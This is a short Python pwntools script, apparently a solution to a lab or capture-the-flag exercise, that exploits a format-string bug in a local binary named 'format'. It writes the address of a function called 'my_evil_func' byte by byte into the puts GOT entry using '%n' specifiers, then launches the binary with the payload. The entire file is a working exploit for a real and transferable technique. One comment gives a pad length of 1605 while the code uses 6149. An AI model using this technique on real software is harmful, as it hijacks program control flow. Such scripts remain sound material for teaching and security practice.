#!/usr/bin/env python3

from pwn import *

binary = "./format"
context.binary = binary

elf = ELF("./format")
# total length of the argument
pad = 6149

# address of puts@got
puts_got = elf.got['puts']
print(hex(puts_got))

# index to use in printf format string
# originally 175 but it seems to be shifted in this payload

# !!!WARNING: check if the  buf_idx is correct on your machine by inspecting the output of the script!!!
buf_idx = 186

# format string for printing hex values (spaces added for better printing)
read_fmt  = " %{}$x "
# format string for writing values in memory
write_fmt = "%{}$n"

fmt = write_fmt

func_addr = p32(elf.symbols['my_evil_func'])

# write the addresses of each individual byte from the got address
payload  = pack(puts_got+0)
payload += pack(puts_got+1)
payload += pack(puts_got+2)
payload += pack(puts_got+3)
# Use format strings to print/write at the addresses above
payload += (func_addr[0] - 16) * b'a' + fmt.format(buf_idx+0).encode()
payload += (func_addr[1] - func_addr[0]) * b'b' + fmt.format(buf_idx+1).encode()
payload += (0x100 + func_addr[2] - func_addr[1]) * b'c' + fmt.format(buf_idx+2).encode()
payload += (func_addr[3] - func_addr[2]) * b'd' + fmt.format(buf_idx+3).encode()

# pad payload until 1605
fmt = payload + b"A" * (pad-len(payload))
# fmt = b'ABCD' + b'%08x\n   ' * 0x300 + b'\n'

io = process(["./format", fmt])

io.send(b'a')

print(io.recvall())
